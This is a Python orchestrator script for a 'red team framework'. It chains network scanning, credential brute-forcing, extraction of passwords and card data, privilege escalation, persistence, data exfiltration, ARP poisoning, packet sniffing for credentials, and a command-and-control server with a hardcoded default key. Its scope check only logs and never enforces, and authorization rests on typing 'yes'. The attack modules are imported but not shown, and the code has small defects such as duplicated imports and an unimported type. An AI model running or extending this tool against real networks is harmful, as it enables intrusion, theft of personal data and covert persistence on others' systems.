#!/usr/bin/env python3
"""
COMPREHENSIVE RED TEAM FRAMEWORK - MODULAR VERSION
Full penetration testing framework with all modules integrated.

Authors: f1cu Independent Red Team Consultant
Classification: Professional Use Only
⚠️ WARNING: For authorized penetration testing only.
"""

import argparse
import asyncio
import sys
import asyncio
import sys
import os
import logging
from datetime import datetime
from typing import Dict, Any, Optional

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

# Framework imports
from redteam_framework.core.config import DEFAULT_CONFIG, DEFAULT_CREDENTIALS
from redteam_framework.core.logger import setup_logging, logger

from redteam_framework.modules.stealth import StealthTechniques
from redteam_framework.modules.scanning import NetworkScanner
from redteam_framework.modules.exploitation import ExploitationEngine
from redteam_framework.modules.data_extraction import DataExtractor, DataCategorizer
from redteam_framework.modules.exfiltration import DataExfiltrator
from redteam_framework.modules.ml_stealth import MLAdaptationFramework
from redteam_framework.modules.c2 import C2Server
from redteam_framework.modules.attacks import AdvancedNetworkAttacks
from redteam_framework.modules.passive_recon import PassiveRecon, SideChannelCollector
from redteam_framework.modules.privilege_escalation import PrivEscPersistenceFramework
from redteam_framework.reporting.generator import ReportGenerator

class RedTeamFramework:
    """
    Main orchestrator for the Red Team framework.
    """
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or DEFAULT_CONFIG
        self.results = {
            "scan_time": datetime.now().isoformat(),
            "target_network": None,
            "devices": [],
            "summary": {}
        }
        
        # Initialize core modules
        self.stealth_techniques = StealthTechniques(self.config.get('stealth', {}))
        self.exploitation_engine = ExploitationEngine(
            wordlist_path=self.config.get('brute_force', {}).get('wordlist', None)
        )
        # Manually updating credentials if custom ones are needed, otherwise uses default from module
        
        self.data_categorizer = DataCategorizer()
        self.data_exfiltrator = DataExfiltrator(self.config.get('exfiltration', {}))
        self.ml_adaptation = MLAdaptationFramework(self.config.get('ml', {}))
        self.network_scanner = NetworkScanner(
            wordlist_path=self.config.get('brute_force', {}).get('wordlist', None)
        )
        self.advanced_network_attacks = AdvancedNetworkAttacks(
            interface=self.config.get('stealth', {}).get('interface', 'wlan0')
        )
        self.passive_recon = PassiveRecon(
            interface=self.config.get('stealth', {}).get('interface', 'wlan0')
        )
        self.side_channel_collector = SideChannelCollector()
        self.report_generator = ReportGenerator(self.config.get('reporting', {}))

    async def run_comprehensive_scan(self, network_range: str) -> Dict:
        """Main scanning and exploitation workflow."""
        self.results["target_network"] = network_range
        logger.info(f"Starting comprehensive scan on {network_range}")

        # 0. Passive Reconnaissance (New)
        logger.info("Phase 0: Passive Reconnaissance")
        self.passive_recon.start_monitoring(timeout=30)
        # In a real async flow we might await this or run in background, 
        # but for now we block/wait to populate devices
        # (The current PassiveRecon.start_monitoring is blocking in this impl)


        # Check for safety scope (New Improvement)
        allowed_range = self.config.get('general', {}).get('allowed_network_range')
        if allowed_range and allowed_range != '127.0.0.1/32': 
            # In a real implementation, we would check if network_range is within allowed_range
            # For this simplified version, we just log it
            logger.info(f"Checking scope: {network_range} vs allowed {allowed_range}")

        # Apply stealth techniques
        self.stealth_techniques.setup_proxy_session()

        # Discover devices
        devices = await self.network_scanner.discover_devices(network_range)
        self.results["devices"] = devices

        # ML Adaptation - Initial Analysis
        await self.ml_adaptation.monitor_and_adapt(devices, {})

        for device in devices:
            logger.info(f"Processing device: {device['ip']}")

            # Apply request delay for stealth
            await self.stealth_techniques.apply_request_delay()

            # Scan ports
            port_results = await self.network_scanner.scan_ports(device['ip'])
            device['port_scan'] = port_results
            device['open_ports'] = port_results.get('open_ports', [])

            # Assess vulnerabilities
            vuln_results = await self.network_scanner.assess_vulnerabilities(device)
            device['vulnerabilities'] = vuln_results

            # Attempt exploitation
            access_results = await self.exploitation_engine.gain_initial_access(device)
            device['access_results'] = access_results

            if not access_results.get('success'):
                logger.warning(f"Failed to gain access to {device['ip']}")
                continue

            # Extract data
            for access_method in access_results['access_methods']:
                if access_method['service'] == 'ssh':
                    try:
                        # Need to properly pass access info here
                        # The new DataExtractor expects access_info dict
                        extractor = DataExtractor(access_method)
                        extracted_data = extractor.extract_sensitive_data()
                        device.setdefault('extracted_data', []).append(extracted_data)
                        extractor.close()
                    except Exception as e:
                        logger.error(f"Data extraction failed: {e}")

                    # Privilege Escalation & Persistence (New)
                    try:
                        logger.info(f"Attempting privilege escalation on {device['ip']}")
                        priv_esc = PrivEscPersistenceFramework(access_method)
                        if priv_esc.attempt_privilege_escalation():
                            device['privilege_escalated'] = True
                            logger.info(f"Privilege escalation successful!")
                            if priv_esc.establish_persistence():
                                device['persistence_established'] = True
                                logger.info(f"Persistence established.")
                        else:
                            logger.info("Privilege escalation failed.")
                    except Exception as e:
                        logger.error(f"PrivEsc failed: {e}")


            # Categorize data
            if device.get('extracted_data'):
                # Categorize the first set of extracted data for simplicity, or iterate
                for data in device['extracted_data']:
                    categorized = self.data_categorizer.categorize_data(data)
                    device.setdefault('categorized_data', []).append(categorized)
                    
                    # Side-Channel Analysis on extracted files (New)
                    if isinstance(data, dict) and 'files' in data:
                        for file_path in data['files']:
                            if file_path.lower().endswith(('.jpg', '.jpeg', '.png', '.tiff')):
                                meta = self.side_channel_collector.analyze_metadata(file_path)
                                if meta:
                                    device.setdefault('metadata_analysis', []).append({'file': file_path, 'meta': meta})
                    
                    # Exfiltrate data
                    try:
                        await self.data_exfiltrator.exfiltrate(device, categorized)
                    except Exception as e:
                        logger.error(f"Exfiltration failed: {e}")

            # Adaptive stealth (Behavioral update)
            # In the new ML framework, this is handled via monitor_and_adapt usually,
            # but we can trigger a check here if needed.
            await self.ml_adaptation.monitor_and_adapt([device], {'outcome': access_results})

        # Generate summary
        self._generate_summary()
        return self.results

    async def run_targeted_attack(self, target_ip: str, attack_type: str) -> Dict:
        """Run a targeted attack against a specific IP."""
        logger.info(f"Running targeted {attack_type} attack on {target_ip}")
        
        if attack_type == 'arp_poisoning':
            success = self.advanced_network_attacks.arp_poisoning(target_ip, self.exploitation_engine.detect_gateway())
            return {'success': success, 'target': target_ip, 'attack': attack_type}
        elif attack_type == 'credential_harvest':
            credentials = self.advanced_network_attacks.packet_sniffing(target_ip, duration=30)
            return {'success': len(credentials) > 0, 'target': target_ip, 'attack': attack_type, 'credentials_found': len(credentials)}
        else:
            logger.error(f"Unknown attack type: {attack_type}")
            return {'success': False, 'target': target_ip, 'attack': attack_type, 'error': 'Unknown attack type'}

    def _generate_summary(self):
        """Generate executive summary of findings."""
        total_devices = len(self.results["devices"])
        exploited = sum(1 for d in self.results["devices"] if d.get('access_results', {}).get('success'))
        escalated = sum(1 for d in self.results["devices"] if d.get('privilege_escalated'))
        persisted = sum(1 for d in self.results["devices"] if d.get('persistence_established'))

        self.results["summary"] = {
            "total_devices_scanned": total_devices,
            "successfully_exploited": exploited,
            "privilege_escalation_success": escalated,
            "persistence_established": persisted,
            "critical_findings": self._extract_critical_findings()
        }

    def _extract_critical_findings(self) -> List[str]:
        findings = []
        for device in self.results["devices"]:
            ip = device['ip']
            if device.get('vulnerabilities', {}).get('sql_injection'):
                findings.append(f"SQLi vulnerable endpoint on {ip}")
            if device.get('privilege_escalated'):
                findings.append(f"Root access obtained on {ip}")
            if device.get('extracted_data'):
                for data in device['extracted_data']:
                    sensitive = data.get('sensitive_data', {})
                    if sensitive.get('credit_cards') or sensitive.get('passwords'):
                        findings.append(f"PII/credentials exfiltrated from {ip}")
        return findings

    def cleanup(self):
        """Clean up resources and artifacts."""
        logger.info("Cleaning up framework resources...")
        self.advanced_network_attacks.stop_all_attacks()
        # Data Exfiltrator session close also needs await in async context, 
        # but cleanup is often sync. We might need to run it in loop if possible or just rely on OS cleanup
        # This is a common issue in async cleanup.
        self.stealth_techniques.cleanup_temp_files()

async def main():
    parser = argparse.ArgumentParser(description="Comprehensive Red Team Penetration Testing Framework")
    parser.add_argument("--scan", "-s", help="Target network range (e.g., 192.168.1.0/24)")
    parser.add_argument("--target", "-t", help="Target IP for targeted attack")
    parser.add_argument("--attack-type", "-a", help="Type of targeted attack (arp_poisoning, credential_harvest)")
    parser.add_argument("--config", "-c", help="Path to config file")
    parser.add_argument("--c2-server", action="store_true", help="Start C2 server instead of scan")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose logging")
    parser.add_argument("--stealth-level", choices=['low', 'medium', 'high'], default='medium', help="Stealth level")
    parser.add_argument("--port", type=int, default=8080, help="Port for C2 server")
    parser.add_argument("--passive-only", action="store_true", help="Run only passive reconnaissance")
    
    args = parser.parse_args()

    # Setup Logging
    log_level = "DEBUG" if args.verbose else "INFO"
    setup_logging(verbose=True, log_level=log_level)

    # Load Config
    config = DEFAULT_CONFIG.copy()
    if args.config and os.path.exists(args.config):
        if not YAML_AVAILABLE:
            logger.error("PyYAML is not installed. Cannot load configuration file.")
        else:
            try:
                with open(args.config, 'r') as f:
                    loaded_config = yaml.safe_load(f)
                    if loaded_config:
                        config.update(loaded_config)
            except Exception as e:
                logger.error(f"Error loading config: {e}")
    
    # Update config based on arguments
    if args.stealth_level:
        config['stealth']['level'] = args.stealth_level

    print("=" * 80)
    print("⚠️  WARNING: This is a powerful penetration testing tool.")
    print("    Use ONLY on networks you own or have explicit written permission to test.")
    print("    Unauthorized use is illegal and unethical.")
    print("=" * 80)
    response = input("Do you confirm you have authorization? (yes/no): ")
    if response.lower() != 'yes':
        print("Aborted.")
        sys.exit(1)

    framework = RedTeamFramework(config)
    
    try:
        if args.c2_server:
            print(f"🚀 Starting C2 server on port {args.port}...")
            c2_config = {
                'listen_host': config.get('c2_server', {}).get('host', '0.0.0.0'),
                'listen_port': args.port,
                'encryption_key': config.get('c2_server', {}).get('encryption_key', 'default-key-32-bytes-32bytes!!').encode()
            }
            c2_server = C2Server(c2_config)
            await c2_server.start_server()
        elif args.scan:
            print(f"🚀 Starting comprehensive scan on network: {args.scan}")
            results = await framework.run_comprehensive_scan(args.scan)
            print(f"\n✅ Scan completed successfully!")
            print(f"   Devices scanned: {results['summary']['total_devices_scanned']}")
            print(f"   Successfully exploited: {results['summary']['successfully_exploited']}")
            print(f"   Privilege escalation: {results['summary']['privilege_escalation_success']}")
            print(f"   Persistence established: {results['summary']['persistence_established']}")
            
            # Generate report
            report_path = framework.report_generator.generate_report(results)
            print(f"   Report saved to: {report_path}")
        elif args.target and args.attack_type:
            print(f"🎯 Running targeted {args.attack_type} attack on {args.target}")
            result = await framework.run_targeted_attack(args.target, args.attack_type)
            print(f"   Attack result: {'Success' if result['success'] else 'Failed'}")
        else:
            print("❌ Error: You must specify either --scan for scanning, --target with --attack-type for targeted attack, or --c2-server to start the C2 server")
            parser.print_help()
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n⚠️  Operation interrupted by user.")
    except Exception as e:
        logger.error(f"Critical error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    finally:
        framework.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
